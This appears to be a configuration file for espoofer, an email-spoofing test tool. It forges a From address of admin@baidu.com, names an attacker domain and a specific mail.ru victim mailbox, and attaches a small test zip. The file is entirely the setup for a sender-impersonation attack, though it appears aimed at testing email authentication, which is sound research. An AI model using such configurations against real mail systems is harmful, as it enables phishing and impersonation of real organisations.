config = {
	"attacker_site": b"whitemili.com", # attack.com
	"legitimate_site_address": b"admin@baidu.com", # From header address displayed to the end-user
	"victim_address": b"anjhz0318@mail.ru", # RCPT TO and message.To header address, 
	"case_id": b"server_a1", #  You can find all case_id using -l option.

	# The following fields are optional
	"server_mode":{
		"recv_mail_server": "", # If no value, espoofer will query the victim_address to get the mail server ip
		"recv_mail_server_port": 25,
		"starttls": False,
	},
	"client_mode": {
		"sending_server": ("smtp.gmail.com", 587),
		"username": b"attacker@gmail.com",
		"password": b"",
	},

	# Optional. You can leave them empty or customize the email message header or body here
	"subject_header": b"Subject: Test-Attachment-1\r\n",  # Subject: Test espoofer\r\n
	"to_header": b"To: <anjhz0318@mail.ru>\r\n", # To: <alice@example.com>\r\n
	"body":
            b"------=_Part_110577_1088466274.1679920903686\r\n"+\
            b"Content-Type: text/plain; charset=\"UTF-8\"\r\n"+\
            b"\r\n"+\
            b"https://www.tsinghua.edu.cn/\r\n"+\
            b"------=_Part_110577_1088466274.1679920903686\r\n"+\
            b"Content-Type: multipart/alternative;\r\n" +\
	        b"\tboundary=\"----=_Part_110579_1673380096.1679920903686\"\r\n"+\
            b"\r\n"+\
            b"------=_Part_110579_1673380096.1679920903686\r\n"+\
            b"Content-Type: text/plain; charset=GBK\r\n"+\
            b"Content-Transfer-Encoding: base64\r\n"+\
            b"\r\n"+\
            b"Cg==\r\n"+\
            b"------=_Part_110579_1673380096.1679920903686\r\n"+\
            b"Content-Type: text/html; charset=GBK\r\n"+\
            b"Content-Transfer-Encoding: base64\r\n"+\
            b"\r\n"+\
            b"PGRpdiBzdHlsZT0ibGluZS1oZWlnaHQ6MS43O2NvbG9yOiMwMDAwMDA7Zm9udC1zaXplOjE0cHg7\r\n"+\
            b"Zm9udC1mYW1pbHk6QXJpYWwiPjxwIHN0eWxlPSJtYXJnaW46MDsiPjxicj48L3A+PC9kaXY+\r\n"+\
            b"------=_Part_110579_1673380096.1679920903686--\r\n"+\
            b"\r\n"+\
            b"------=_Part_110577_1088466274.1679920903686\r\n"+\
            b"Content-Type: application/zip; name=whatever.zip\r\n"+\
            b"Content-Transfer-Encoding: base64\r\n"+\
            b"Content-Disposition: attachment; filename=\"whatever.zip\"\r\n"+\
            b"\r\n"+\
            b"UEsDBBQAAAAIACule1azQxFOCgAAAAgAAAAMAAAAd2hhdGV2ZXIudHh0K89ILEktSy0CAFBLAQIU\r\n"+\
            b"ABQAAAAIACule1azQxFOCgAAAAgAAAAMACQAAAAAAAAAIAAAAAAAAAB3aGF0ZXZlci50eHQKACAA\r\n"+\
            b"AAAAAAEAGAB14rFuqWDZAXK5MW+pYNkBGBwcaKlg2QFQSwUGAAAAAAEAAQBeAAAANAAAAAAA\r\n"+\
            b"------=_Part_110577_1088466274.1679920903686--\r\n",

            
            # Test Body.

	# Optional. Set the raw email message you want to sent. It's usually used for replay attacks
	"raw_email": b"", 
}



